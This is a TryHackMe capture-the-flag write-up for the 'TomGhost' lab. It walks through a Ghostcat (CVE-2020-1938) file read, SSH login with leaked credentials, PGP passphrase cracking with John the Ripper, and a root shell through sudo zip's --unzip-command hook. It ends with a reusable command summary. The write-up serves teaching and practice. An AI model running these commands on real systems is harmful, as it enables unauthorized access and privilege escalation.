# TomGhost - TryHackMe

> **Kill Chain Summary**: Enumerate Apache Tomcat 9.0.30 and exploit the unauthenticated Ghostcat vulnerability (`CVE-2020-1938`) on the exposed AJP13 connector (port 8009) to read `WEB-INF/web.xml`, disclosing cleartext SSH credentials for user `skyfuck`. Authenticate via SSH and locate an encrypted file `credential.pgp` alongside an ASCII-armored private key `tryhackme.asc`, extract and crack the PGP passphrase (`alexandru`) using `gpg2john` and John the Ripper, and decrypt the credential payload to escalate laterally to user `merlin`. Finally, leverage `sudo` permissions on the `/usr/bin/zip` binary using the `--unzip-command` execution hook to break out into a root shell.

| Property | Value |
| --- | --- |
| **Target Name** | TomGhost |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Apache Tomcat AJP Connector Exploitation (Ghostcat / CVE-2020-1938), Arbitrary File Read (LFI), Cleartext Credential Harvesting, PGP Private Key Passphrase Cracking (gpg2john / John the Ripper), PGP Decryption, Sudo Zip Execution Hook (GTFOBins) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed to identify listening services on the target:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **22/tcp** | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 | Secure Shell Administration |
| **8009/tcp** | ajp13 | Apache Jserv (Protocol v1.3) | AJP Connector |
| **8080/tcp** | http | Apache Tomcat 9.0.30 | Java Servlet Container |

### Service and Vulnerability Analysis

1. **Port 8080 (Apache Tomcat)**:
   Accessing the web root displays the default Apache Tomcat 9.0.30 landing page.

2. **Port 8009 (Apache Jserv Protocol)**:
   The Apache Jserv Protocol (AJP13) is a binary protocol designed to route requests from an edge web server (such as Apache httpd or Nginx) into an upstream Tomcat application container.

   Apache Tomcat versions prior to 7.0.100, 8.5.51, and 9.0.31 configured with an enabled AJP connector are vulnerable to **Ghostcat (CVE-2020-1938)**. This vulnerability allows an unauthenticated remote attacker communicating over port 8009 to read arbitrary files from within the web application directories, including protected directories such as `WEB-INF/` and `META-INF/`.

---

## 2. Initial Access

### Exploiting Ghostcat (CVE-2020-1938)

The target is running Apache Tomcat 9.0.30 with an unauthenticated AJP connector exposed on port 8009.

Using a standalone Python exploit script, an arbitrary file read request was directed at the web application configuration file `WEB-INF/web.xml`:

```bash
python2 CVE-2020-1938.py 10.129.175.131 -p 8009 -f WEB-INF/web.xml
```

The script successfully returned the XML configuration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
```

The file contained cleartext credentials for user `skyfuck`:
`skyfuck:8730281lkjlkjdqlksalks`

### SSH Initial Access

Connecting to OpenSSH on port 22 with the discovered credentials:

```bash
ssh skyfuck@10.129.175.131
```

Authentication succeeded, providing a terminal session:

```bash
skyfuck@ubuntu:~$ id
uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
```

---

## 3. Privilege Escalation

### Lateral Movement: PGP Private Key Cracking

Inspecting the home directory of `skyfuck` revealed two cryptographic files:

```bash
ls -la /home/skyfuck
```

- `credential.pgp` (PGP encrypted file)
- `tryhackme.asc` (ASCII-armored PGP private key)

To decrypt `credential.pgp`, the private key in `tryhackme.asc` must be imported into GPG. However, the private key is protected by a passphrase.

#### Passphrase Extraction and Cracking

Both files were copied to the attack machine using `scp`:

```bash
scp skyfuck@10.129.175.131:/home/skyfuck/* .
```

The password hash of the private key was extracted using `gpg2john`:

```bash
gpg2john tryhackme.asc > gpg_hash.txt
```

Cracking the hash using John the Ripper and `rockyou.txt`:

```bash
john gpg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked Passphrase:
```text
alexandru        (tryhackme)
```

#### Decrypting the Credential Payload

On the target host, the private key was imported into GPG:

```bash
gpg --import tryhackme.asc
```

Decrypting `credential.pgp` using the cracked passphrase:

```bash
gpg --decrypt credential.pgp
# Enter passphrase: alexandru
```

Decrypted Content:
```text
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

Switching user to `merlin`:

```bash
su merlin
# Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

The user flag was retrieved:

```bash
cat /home/merlin/user.txt
[FLAG REDACTED]
```

---

### Privilege Escalation: Sudo Zip Execution Hook (GTFOBins)

Auditing the sudo privileges assigned to user `merlin`:

```bash
sudo -l
```

Output:
```text
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

#### Exploitation via `--unzip-command`

The `/usr/bin/zip` binary features a testing flag (`-T`) that allows the user to specify a command to test the integrity of an archive via `--unzip-command`. 

When run under `sudo`, the specified command is executed directly with root privileges.

Executing the exploit sequence:

```bash
touch test.txt
sudo zip archive.zip test.txt -T --unzip-command="sh -c /bin/bash"
```

The hook executed `/bin/bash` as root:

```bash
root@ubuntu:/home/merlin# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/merlin# whoami
root
```

The root flag was retrieved:

```bash
cat /root/root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Exploiting Ghostcat (CVE-2020-1938) via AJP13
python2 CVE-2020-1938.py TARGET_IP -p 8009 -f WEB-INF/web.xml

# Extracting and Cracking PGP Private Key Passphrase
gpg2john private_key.asc > gpg_hash.txt
john gpg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Importing PGP Keys and Decrypting Files
gpg --import private_key.asc
gpg --decrypt encrypted_file.pgp

# Sudo Zip Privilege Escalation (GTFOBins)
touch dummy.txt
sudo zip test.zip dummy.txt -T --unzip-command="sh -c /bin/bash"
```

---

## 5. Key Takeaways and Lessons Learned

1. **AJP Connector Risks (Port 8009)**:
   The Apache Jserv Protocol should never be exposed to untrusted networks. Ghostcat (CVE-2020-1938) provides unauthenticated file read access across the application directory, regularly exposing sensitive database settings, hardcoded API secrets, and administrative credentials in `WEB-INF/web.xml`.

2. **Cracking Encrypted PGP Keys**:
   When encountering encrypted GPG/PGP artifacts (`.pgp`, `.gpg`, `.asc`), verify whether both the cipher payload and private key are present. Extracting the passphrase hash with `gpg2john` followed by dictionary cracking with John the Ripper allows full decryption of historical secrets.

3. **Archive Utilities as Privilege Escalation Hooks**:
   Standard archive utilities like `zip`, `tar`, and `cpio` often possess command execution hooks or parameter expansion capabilities (`--unzip-command`, `--checkpoint-action`). Auditing GTFOBins when finding archive utilities in `sudo -l` yields immediate root breakout vectors.

---

#thm #linux #ubuntu #tomcat #ajp #ghostcat #cve-2020-1938 #pgp #gpg2john #johntheripper #sudo #gtfobins #zip #easy
